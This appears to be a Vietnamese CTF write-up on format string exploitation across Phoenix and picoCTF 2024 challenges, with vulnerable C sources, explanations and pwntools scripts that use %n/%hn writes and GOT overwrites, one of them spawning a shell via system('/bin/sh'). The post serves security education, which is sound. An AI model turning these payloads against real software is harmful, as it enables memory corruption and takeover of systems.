---
title: Format String
published: 2024-07-13
category: "CTF"
tags: [PWN, CTF]
---


# [FORMAT ZERO (phoenix)](https://exploit.education/phoenix/format-zero)
## Source code
```c
/*
 * phoenix/format-zero, by https://exploit.education
 *
 * Can you change the "changeme" variable?
 *
 * 0 bottles of beer on the wall, 0 bottles of beer! You take one down, and
 * pass it around, 4294967295 bottles of beer on the wall!
 */

#include <err.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

#define BANNER \
  "Welcome to " LEVELNAME ", brought to you by https://exploit.education"

int main(int argc, char **argv) {
  struct {
    char dest[32];
    volatile int changeme;
  } locals;
  char buffer[16];

  printf("%s\n", BANNER);

  if (fgets(buffer, sizeof(buffer) - 1, stdin) == NULL) {
    errx(1, "Unable to get buffer");
  }
  buffer[15] = 0;

  locals.changeme = 0;

  sprintf(locals.dest, buffer);

  if (locals.changeme != 0) {
    puts("Well done, the 'changeme' variable has been changed!");
  } else {
    puts(
        "Uh oh, 'changeme' has not yet been changed. Would you like to try "
        "again?");
  }

  exit(0);
}
```

- Đọc source code ta thấy chương trình sẽ nhận đầu vào tối đa 15 kí tự vào mảng buffer. Sau khi nhận đầu vào thành công thì nội dung của mảng buffer sẽ được sao chép vào locals.dest. Cuối cùng kiểm tra xem biến changeme có thay đổi không, nếu thayu đổi thì sẽ hoàn thành thử thách
- Bài này ta không thể sử dụng tràn bộ đệm để giải quyết vì đầu vào tối đa 15 kí tự mà mảng char locals.dest được khai báo 32 byte nên không thể ghi đè giá trị vào biến changeme
- Tuy nhiên, chương trình sử dụng hàm sprintf để định dạng mảng char buffer và ghi dữ liệu vào bộ đệm locals.dest
- Lợi dụng lỗ hỏng chuỗi định dạng đó ta có thể ghi %x chỉ 2 kí tự nhưng khi qua hàm sprintf thì nó sẽ có dạng giá trị hex gồm 8 kí tự
- Vậy muốn điền vào bộ đệm của locals.dest 32 kí tự thì ta có thể sử dụng `%<pading>x`, trong đó pading là số lượng kí tự trống, và khi enter hàm sprintf tự động lưu ký tự xuống dòng có giá trị là 0x0a vào bộ đệm lân cận

    
# [FORMAT ONE (phoenix)](https://exploit.education/phoenix/format-one/)
## Source code
```c 
/*
 * phoenix/format-one, by https://exploit.education
 *
 * Can you change the "changeme" variable?
 *
 * Why did the Tomato blush? It saw the salad dressing!
 */

#include <err.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

#define BANNER \
  "Welcome to " LEVELNAME ", brought to you by https://exploit.education"

int main(int argc, char **argv) {
  struct {
    char dest[32];
    volatile int changeme;
  } locals;
  char buffer[16];

  printf("%s\n", BANNER);

  if (fgets(buffer, sizeof(buffer) - 1, stdin) == NULL) {
    errx(1, "Unable to get buffer");
  }
  buffer[15] = 0;

  locals.changeme = 0;

  sprintf(locals.dest, buffer);

  if (locals.changeme != 0x45764f6c) {
    printf("Uh oh, 'changeme' is not the magic value, it is 0x%08x\n",
        locals.changeme);
  } else {
    puts("Well done, the 'changeme' variable has been changed correctly!");
  }

  exit(0);
}
```
- Level này tương tự với format-zero nhưng khác một chút đó là phải làm biến changeme có giá trị là 0x45764f6c
- Ta chỉ cần làm tương tự level trước đó và thêm giá trị vào sau
# [FORMAT TWO (phoenix)](https://exploit.education/phoenix/format-two/)
## Source code
```c 
/*
 * phoenix/format-two, by https://exploit.education
 *
 * Can you change the "changeme" variable?
 *
 * What kind of flower should never be put in a vase?
 * A cauliflower.
 */

#include <err.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

#define BANNER \
  "Welcome to " LEVELNAME ", brought to you by https://exploit.education"

int changeme;

void bounce(char *str) {
  printf(str);
}

int main(int argc, char **argv) {
  char buf[256];

  printf("%s\n", BANNER);

  if (argc > 1) {
    memset(buf, 0, sizeof(buf));
    strncpy(buf, argv[1], sizeof(buf));
    bounce(buf);
  }

  if (changeme != 0) {
    puts("Well done, the 'changeme' variable has been changed correctly!");
  } else {
    puts("Better luck next time!\n");
  }

  exit(0);
}
```
- Ta cần thay đổi giá trị biến `changeme` 
- Chương trình cho ta nhập đối số và sao chép sang biến `buf`
- Nhập chuỗi định dạng để tìm được vị trí của biến `buf` trên stack
- Ta thấy chuỗi ký tự `A` có mã hex là `0x41` đang nằm ở vị trí thứ 12 
- Ta tìm địa chỉ `changeme` sau đó nhập vào và dùng định dạng `%n` để thay đổi giá trị 
- Địa chỉ `changeme` là `0x600af0`
- Nhưng địa chỉ này có byte `0x0a` là kí tự xuống dòng nên khi nhập dữ liệu sẽ kết thúc ở đây nên cần thay đổi địa chỉ `changeme`
- Đổi sang kiến trúc 32 bit thì giá trị `changeme` đã đổi
- Nhập địa chỉ này và dùng `%n` để thay đổi giá trị
# [FORMAT THREE (phoenix)](https://exploit.education/phoenix/format-three/)
## Source code
```c 
/*
 * phoenix/format-three, by https://exploit.education
 *
 * Can you change the "changeme" variable to a precise value?
 *
 * How do you fix a cracked pumpkin? With a pumpkin patch.
 */

#include <err.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

#define BANNER \
  "Welcome to " LEVELNAME ", brought to you by https://exploit.education"

int changeme;

void bounce(char *str) {
  printf(str);
}

int main(int argc, char **argv) {
  char buf[4096];
  printf("%s\n", BANNER);

  if (read(0, buf, sizeof(buf) - 1) <= 0) {
    exit(EXIT_FAILURE);
  }

  bounce(buf);

  if (changeme == 0x64457845) {
    puts("Well done, the 'changeme' variable has been changed correctly!");
  } else {
    printf(
        "Better luck next time - got 0x%08x, wanted 0x64457845!\n", changeme);
  }

  exit(0);
}
```
- Thử thách này tương tự với thử thách trước nhưng phải thay đổi biến `changeme` thành giá trị `0x64457845`
- Dùng kiến trúc 32 bit vì kiến trúc 64 bit thì địa chỉ `changeme` là `0x600af0` có byte `0x0a`
- Tìm địa chỉ `changeme`
- Tìm vị trí của biến `buf` trên ngăn xếp 
- Ta thấy các byte `0x41` nằm ở vị trí thứ 12 
- Để thay đổi giá trị của biến `changeme` ta dùng `%n` để thay - Nếu muốn `changeme` bằng `0x64457845` ta cần `0x64457845` byte trước `%n` để thay đổi giá trị nhưng giá trị này rất lớn nên ta thay đổi giá trị từng byte 
- Ta đưa địa chỉ từng byte vào dữ liệu đầu vào
```python
from pwn import *

changeme = 0x8049844

payload = p32(changeme)
payload += p32(changeme+1)
payload += p32(changeme+2)
payload += p32(changeme+3)

payload += '%x '*11
payload += '%n'

print(payload)

```
- Ta xem địa chỉ đầu tiên đã có giá trị là bao nhiêu sao khi `%n` với dữ liệu trên
- Ta được `0x51` nhưng ta cần giá trị là `0x45` nên ta sẽ đưa thêm dữ liệu vào đủ `0x145` để có được byte giá trị đầu là `0x45`, cần thêm `0x145 - 0x51 = 244 byte`
- Tiếp theo ta đổi giá trị byte thứ 2, giá trị này phụ thuộc vào số byte ở trước nó nhưng ta không biết chính xác nên dùng `%n` để biết đã có giá trị bao nhiêu
- Ta thấy byte thứ 2 đã là `0x45` nhưng ta cần là `0x78` nên cần `0x78 - 0x45 = 51 byte`
- Tương tự với byte thứ 3 và byte thứ 4 làm tương tự
## Script
```python=
from pwn import *

changeme = 0x8049844

payload = p32(changeme)
payload += p32(changeme+1)
payload += p32(changeme+2)
payload += p32(changeme+3)

payload += '%x '*11
payload += 'a'*244
payload += '%n'

payload += 'a'*51
payload += '%n'

payload += 'a'*205
payload += '%n'

payload += 'a'*31
payload += '%n'
print(payload)
```

# [FORMAT FOUR (phoenix)](https://exploit.education/phoenix/format-four/)
## Source code
```c 
/*
 * phoenix/format-four, by https://exploit.education
 *
 * Can you affect code execution? Once you've got congratulations() to
 * execute, can you then execute your own shell code?
 *
 * Did you get a hair cut?
 * No, I got all of them cut.
 *
 */

#include <err.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

#define BANNER \
  "Welcome to " LEVELNAME ", brought to you by https://exploit.education"

void bounce(char *str) {
  printf(str);
  exit(0);
}

void congratulations() {
  printf("Well done, you're redirected code execution!\n");
  exit(0);
}

int main(int argc, char **argv) {
  char buf[4096];

  printf("%s\n", BANNER);

  if (read(0, buf, sizeof(buf) - 1) <= 0) {
    exit(EXIT_FAILURE);
  }

  bounce(buf);
}
```
- Xem các lớp bảo vệ của chương trình
- Thử thách này ta cần nhảy vào hàm `congratulations()`
- Ta thấy hàm `bounce` sau khi `printf(str)` thì gọi hàm `exit(0)`
- Ý tưởng của bài này là ghi chuyển hướng thực thi của hàm `exit` sang hàm `congratulations` bằng cách ghi đè bảng `GOT` của hàm `exit` thành địa chỉ của hàm `congratulations`
- Chế độ bảo vệ `RELRO` đã tắt cho phép bảng GOT có thể ghi được
- Tìm địa chỉ của `exit`
- Địa chỉ của `exit` là `0x080497e4`
- Tìm địa chỉ của hàm `congratulations`
- Địa chỉ của hàm `congratulations` là `0x8048503`
- Ta cần đặt giá trị `0x8048503` vào địa chỉ `0x080497e4` của hàm `exit` để khi gọi hàm `exit` thì sẽ được trỏ đến hàm gọi hàm `congratulations`
- Để thay đổi giá trị ta dùng định dạng `%n` tương tự thử thách trước
- Tìm vị trí biến `buf` trong stack
- Ta thấy vị trí của biến `buf` nằm ở vị trí thứ 12
- Làm tương tự như thử thách trước để thay đổi giá trị tại địa chỉ `0x080497e4` thành `0x8048503`
## Script
```python=
from pwn import *

exit = 0x080497e4

payload = p32(exit)
payload += p32(exit+1)
payload += p32(exit+2)
payload += p32(exit+3)

payload += '%x '*11
payload += 'a'*178
payload += '%n'

payload += 'a'*130
payload += '%n'

payload += 'a'*127
payload += '%n'

payload += 'a'*4
payload += '%n'
print(payload)
```
# [format string 2 (picoctf2024)](https://play.picoctf.org/practice/challenge/448?category=6&page=2)
## Source code
```c 
#include <stdio.h>

int sus = 0x21737573;

int main() {
  char buf[1024];
  char flag[64];


  printf("You don't have what it takes. Only a true wizard could change my suspicions. What do you have to say?\n");
  fflush(stdout);
  scanf("%1024s", buf);
  printf("Here's your input: ");
  printf(buf);
  printf("\n");
  fflush(stdout);

  if (sus == 0x67616c66) {
    printf("I have NO clue how you did that, you must be a wizard. Here you go...\n");

    // Read in the flag
    FILE *fd = fopen("flag.txt", "r");
    fgets(flag, 64, fd);

    printf("%s", flag);
    fflush(stdout);
  }
  else {
    printf("sus = 0x%x\n", sus);
    printf("You can do better!\n");
    fflush(stdout);
  }

  return 0;
}
```
- Có lỗi `format string` ở `printf(buf)`
- Ta cần thay đổi giá trị biến `sus` thành `0x67616c66` để có thể lấy flag
- Ta tìm địa chỉ biến `sus`
- Địa chỉ biến `sus` là `0x404060` 
- Để lợi dụng lỗi `format string` để thay đổi giá trị biến `sus` ta cần dùng `%n` 
- Vì giá trị `0x67616c66` là số rất lớn có thể gây ra lỗi khi pading qua các byte để ghi được giá trị nên ta chia 2 lần mỗi lần ghi 2 byte với 2 giá trị `0x6761` và `0x6c66`
- Để ghi giá trị 2 byte ta dùng `%hn`
- Vậy ta sẽ ghi 2 giá trị là `0x6c66` vào địa chỉ `0x404060` và giá trị `0x6761` vào địa chỉ `0x404062`
- Để có thể ghi giá trị chính xác phụ thuộc vào số byte ở trước đó nên ta đưa giá trị nhỏ hơn là `0x6761` vào địa chỉ `0x404062` trước 
- Để địa chỉ của biến `sus` và `sus+2` nằm đúng trên một địa chỉ của stack ta pading qua `0x30` sau đó ghi địa chỉ vào 
- Tìm vị trí sau khi pading thì địa chỉ ta đưa vào nằm ở đâu trên stack 
- Địa chỉ ta ghi vào nằm ở `0x7fffffffdc80` 
- Tính ofset `(0x7fffffffdc80 - 0x7fffffffdc10)/8 + 6 = 20`
- Sau khi ghi vào địa chỉ `sus+2` thì ta cần trừ các byte ở trước cho phù hợp để ghi giá trị đúng vào địa chỉ `sus`
`0x6c66 - 0x6761 = 1285 byte`
## Script
```python=
#!/usr/bin/python3

from pwn import *

#p = process('./vuln')

p = remote('rhea.picoctf.net', 57539)
sus = 0x404060

payload = b''
payload += b'%26465c%20$hn%1285c%21$hn'
payload = payload.ljust(0x30, b'a')
payload += p64(sus+2)
payload += p64(sus)

#log.info(payload)
#input()
p.sendlineafter(b'say?\n',payload)

p.interactive()
```
# [format string 3 (picoctf 2024)](https://play.picoctf.org/practice/challenge/449?category=6&page=2)
## Source code
```c 
#include <stdio.h>

#define MAX_STRINGS 32

char *normal_string = "/bin/sh";

void setup() {
        setvbuf(stdin, NULL, _IONBF, 0);
        setvbuf(stdout, NULL, _IONBF, 0);
        setvbuf(stderr, NULL, _IONBF, 0);
}

void hello() {
        puts("Howdy gamers!");
        printf("Okay I'll be nice. Here's the address of setvbuf in libc: %p\n", &setvbuf);
}

int main() {
        char *all_strings[MAX_STRINGS] = {NULL};
        char buf[1024] = {'\0'};

        setup();
        hello();

        fgets(buf, 1024, stdin);
        printf(buf);

        puts(normal_string);

        return 0;
}
```
- Ý tưởng bài này là dùng format string để overwite địa chỉ got của `puts` thành địa chỉ của `system` 
- Hàm `puts` có tham số là `/bin/sh`  nếu đổi thành `system` thì ta chiếm được shell
- Bài này cho địa chỉ của `setvbuf` nên ta tìm được địa chỉ libc
- Ta thấy địa chỉ ofset của hàm `puts` và `system` khác nhau chỉ 3 byte nên ta chỉ cần overwrite 3 byte 
```python=
#!/usr/bin/python3
from pwn import *

context.binary = exe = ELF('./format-string-3', checksec=False)
libc = ELF('./libc.so.6', checksec = False)

p = process(exe.path)

p = remote('rhea.picoctf.net', 55731)
p.recvuntil(b'libc: ')

libc_leak = int(p.recvline()[:-1], 16)
libc.address = libc_leak - libc.sym['setvbuf']
log.info(hex(libc_leak))
log.info(hex(libc.address))

a = {
	libc.sym.system & 0xff : exe.got['puts'] + 0,
	(libc.sym.system >> 8) & 0xffff : exe.got['puts'] + 1,
}
b = sorted(a)

payload = f'%{b[0]}c%48$hhn'.encode()
payload += f'%{b[1] - b[0]}c%49$hn'.encode()
payload = payload.ljust(0x50, b'a')

payload += p64(a[b[0]])
payload += p64(a[b[1]])

log.info(payload)

input()

p.sendline(payload)

p.interactive()
```